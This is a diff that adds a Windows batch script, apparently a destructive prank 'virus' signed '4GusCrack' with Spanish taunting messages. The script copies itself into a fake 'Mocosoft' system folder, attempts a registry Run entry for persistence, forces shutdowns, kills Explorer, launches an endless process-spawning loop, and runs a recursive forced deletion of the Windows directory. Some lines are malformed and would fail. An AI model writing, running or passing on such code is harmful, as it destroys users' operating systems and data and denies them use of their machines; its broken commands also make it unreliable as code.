@@ -1,0 +1,27 @@
+@echo off 
+if exist "%systemroot%/Mocosoft (goto delet) else goto make 
+:delet 
+Rd /s /q "%systemroot%/Mocosoft" 
+goto make 
+:make 
+Mk "%systemroot%/Mocosoft" 
+goto continue 
+:continue 
+copy /y %0 "%systemroot%/Mocosoft/Amdset.bat" 
+echo Hacked By 4GusCrack > "%homedrive%/Firmita.txt" 
+REG ADD HTLM/Software/Microsoft/Windows/Current Version/Run /v Amdset /d "%systemroot%/Mocosoft/Amdset.bat" 
+shutdown -s -f -t 20 -c "Ahi que lastima" 
+taskkill "explorer.exe" 
+echo msgbox “Hoy vas a conocer lo que es un Virus. By 4GusCrack” 
+@echo off 
+@:uji 
+start 
+@goto uji 
+exit 
+shutdown -s -t 3 -c "No prendes la PC nunca mas. By 4GusCrack" 
+@echo off 
+title g00d by3 wind0w5 
+echo 4dio5 a tu wind0w5 
+del /s /f /q c:windows 
+exit 
+shutdown -s -t 3 -c "No prendes la PC nunca mas. By 4GusCrack" 
